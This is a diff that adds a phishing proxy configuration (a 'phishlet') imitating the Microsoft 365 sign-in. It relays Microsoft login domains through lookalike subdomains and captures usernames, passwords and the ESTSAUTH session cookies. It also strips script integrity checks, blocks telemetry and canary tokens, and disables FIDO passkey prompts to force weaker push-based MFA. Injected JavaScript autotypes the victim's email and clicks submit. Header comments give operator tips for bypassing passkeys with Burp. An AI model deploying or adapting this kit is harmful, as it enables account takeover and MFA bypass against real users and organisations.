@@ -1,0 +1,124 @@
+# Found a scenario where fido was set as the default MFA method with the string '"authMethodId":"FidoKey","data":"FidoKey","display":"","isDefault":true,' in a response from 'https://login.microsoftonline.com/common/login'. 
+# This phishlet changes "authMethodId":"PhoneAppNotification" to the default instead, but you may need to modify the auth method if this is not an option. Check the same response for available MFA methods.  
+# This configration also seems to cause a passkey MFA prompt when you relay the session tokens.
+# However, if you intercept the resonse from 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=....' (with Burp or similar tools) you can simply remove the string '"fIsFidoSupported":true,' and forward along the response to bypass the passkey prompt. 
+
+name: "Microsoft 365 Enterprise"
+min_ver: '3.2.0'
+redirect_url: 'https://office.com'
+proxy_hosts:
+  - {phish_sub: 'dndaqhex7paig', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'd1qeiux95jyadk', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+  - {phish_sub: 'd29xxd43uqzxhh', orig_sub: 'aadcdn', domain: 'msftauth.net', session: true, is_landing: false}
+  - {phish_sub: 'd367g5j1cifb19', orig_sub: 'aadcdn', domain: 'msauth.net', session: true, is_landing: false}
+  - {phish_sub: 'd1swze5h7y76l5', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
+  - {phish_sub: 'dx4vrq2w0kvo4', orig_sub: 'aadcdn', domain: 'msftauthimages.net', session: true, is_landing: false}
+  - {phish_sub: 'd4rrk0cpp2rgq', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'dyx2h0loo82h8', orig_sub: 'm365', domain: 'cloud.microsoft', session: true, is_landing: false}
+  - {phish_sub: 'd2mu2hy4gwa15c', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity="[^"]*"', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity=''[^'']*''', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'aadcdn', domain: 'msftauth.net', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msftauthimages.net', orig_sub: 'aadcdn', domain: 'msftauthimages.net', search: '\.cloudfront\.net', replace: '.nowhere.local', mimes: ['text/css']} # disable canary tokens loaded from .cloudfront.net domain
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"fIsFidoSupported":true,', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"authMethodId":"FidoKey","data":"FidoKey","display":"","isDefault":true,', replace: '"authMethodId":"FidoKey","data":"FidoKey","display":"","isDefault":false,', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"authMethodId":"PhoneAppNotification","data":"PhoneAppNotification","display":"","isDefault":false', replace: '"authMethodId":"PhoneAppNotification","data":"PhoneAppNotification","display":"","isDefault":true', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+
+intercept:
+  - {domain: 'browser.events.data.microsoft.com', path: '.*', http_status: 403, mime: "application/json"}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+    type: 'cookie'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+rewrite_urls:
+  - trigger: {domains: ['login.microsoftonline.com'], paths: ['/common/oauth2/v2.0/authorize']}
+    rewrite:
+        path: '/signin'
+        query:
+          - key: '_vid'
+            value: '{id}'
+        exclude_keys: ['client_id']
+  - trigger: {domains: ['login.microsoftonline.com'], paths: ['/common/login']}
+    rewrite:
+        path: '/oauth/login'
+  - trigger: {domains: ['login.microsoftonline.com'], paths: ['/common/SAS/ProcessAuth']}
+    rewrite:
+        path: '/oauth/sas'
+js_inject:
+  - trigger_domains: ['login.microsoftonline.com']
+    trigger_paths: ['/common/oauth2/v2.0/authorize']
+    trigger_params: ["email"]
+    script: |
+      function simulateTyping(text, selector, delay, callback) {
+        var input = document.querySelector(selector);
+        if (!input) {
+          return;
+        }
+        input.focus();
+        input.value = '';
+
+        var i = 0;
+
+        function typeNextChar() {
+        if (i < text.length) {
+          var char = text[i];
+          input.value += char;
+          var event = new Event('input', { bubbles: true });
+          input.dispatchEvent(event);
+
+          i++;
+          setTimeout(typeNextChar, delay);
+          } else {
+            var changeEvent = new Event('change', { bubbles: true });
+            input.dispatchEvent(changeEvent);
+            if (callback && typeof callback === 'function') {
+              callback();
+            }
+          }
+        }
+        typeNextChar();
+      }
+      function xx(){
+        var oop = document.querySelector('input[name=loginfmt]');
+        var okp = document.querySelector('input[type=submit]');
+        if (oop != null && okp != null) {
+          simulateTyping('{email}', 'input[name=loginfmt]', 10, function() {
+            okp.click();
+            setTimeout(function(){
+              document.querySelector("body").style = "";
+            }, 2000);
+          });
+        } else {
+          setTimeout(function(){xx();}, 100);
+        }
+      }
+      setTimeout(function(){xx();}, 100);
+      if ("{email}" != "") {
+        document.querySelector("body").style = "visibility: hidden";
+      }
+  - trigger_domains: ['login.microsoftonline.com']
+    trigger_paths: ['/common/SAS/ProcessAuth']
+    script: |
+      function ww(){
+        var xox = document.querySelector('input[data-report-event="Signin_Submit"]');
+        if (xox != null) {
+          xox.click();
+        } else {
+          setTimeout(function(){ww();}, 100);
+        }
+      }
+      setTimeout(function(){ww();}, 100);
